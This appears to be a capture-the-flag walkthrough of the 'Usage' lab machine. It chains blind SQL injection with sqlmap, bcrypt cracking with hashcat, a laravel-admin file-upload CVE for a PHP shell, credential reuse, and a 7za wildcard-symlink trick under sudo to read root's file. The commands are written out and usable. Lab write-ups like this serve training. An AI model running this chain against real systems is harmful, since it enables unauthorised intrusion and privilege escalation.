#box #SQLi #hashcat #file-upload #7za #unix-wildcards #symbolic-links 
1. The machine shows an open 80 port on which we discover a simple web application. By hovering the `Admin` option we discover a virtual host pointing at `admin.usage.htb`

2. Once added the option the the `hosts` file we discover that also this page shows a login form. After some tries and enumeration we realize that the `http://usage.htb/forget-password` endpoint is vulnerable to SQLi. If we input a SQLi test payload we obtain a success message, confirming it's vulnerable to SQLi. However, since it doesn't return any result we'll have to rely on sqlmap for a Blind Injection.
	
3. With `sqlmap` we first address the format of the given Blind SQL Injection with:
```sh
sqlmap -r test.req --level 5 --risk 3 --batch
```
4. Then, we discover the databases:
```sh
sqlmap -r test.req --level 5 --risk 3 --batch --dbs
```
5. Then the tables:
```sh
sqlmap -r test.req --level 5 --risk 3 --batch -D usage_blog --tables
```
6. Then the columns:
```sh
sqlmap -r test.req --level 5 --risk 3 --batch -D usage_blog -T admin_users --columns
```
7. And finally we dump the password
```sh
sqlmap -r test.req --level 5 --risk 3 --batch -D usage_blog -T admin_users -C password --dump
```
8. Once the password is dumped, we proceed to crack it with hashcat, discovering the password `whatever1
```sh
hashcat -m 3200 '$2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2' /usr/share/wordlists/rockyou.txt
```
9. We proceed to authenticate to `admin.usage.htb` with `admin:whatever1`  (we can do the same SQLI enumerating for usernames)
10. Once authenticated, we discover the effective version of `laravel-admin` being `1.8.18`. This specific version is vulnerable to an Arbitrary File Upload vulnerability that permits us to upload a PHP and gain RCE. To do that, we must go to the user's profile and intercept the call with BurpSuite. After doing that, by reading the CVE https://nvd.nist.gov/vuln/detail/CVE-2023-24249 we proceed to upload the shell accordingly

11. Once done, we can get a shell with `busybox` on port 8003. Gained the shell we discover on the homepage of our user (`dash`) a file named `.monitrc` and, inside of it, we discover a password: `3nc0d3d_pa$$w0rd`. By trying it on the other tty user `xander` we gain access onto `xander:3nc0d3d_pa$$w0rd`.
12. Inside the session as `xander` we discover that we have sudo privileges over a script at `/usr/bin/usage_management`. That script has 3 options, one of the 3 consists in a `7za` command that performs a backup of a folder into a zip file. We discover that at first with `strings /usr/bin/usage_management` (but we have more details with `ghidra`)

13. By having the `*` at the end, we can leverage the following Wildcard Spare Trick specified here: https://hacktricks.wiki/en/linux-hardening/privilege-escalation/wildcards-spare-tricks.html#7-zip--7z--7za. We then create a file inside `/var/www/html` (the folder mentioned above) and we create the following two files, a symlink and a list file (prefixed with `@`):
```sh
cd /var/www/html
ln -s /root/root.txt root.txt
touch @root.txt
sudo /usr/bin/usage_management
```
14. Now, when we'll run the script, due to the wildcard on the shell script, it'll print out the content of the symlinked file
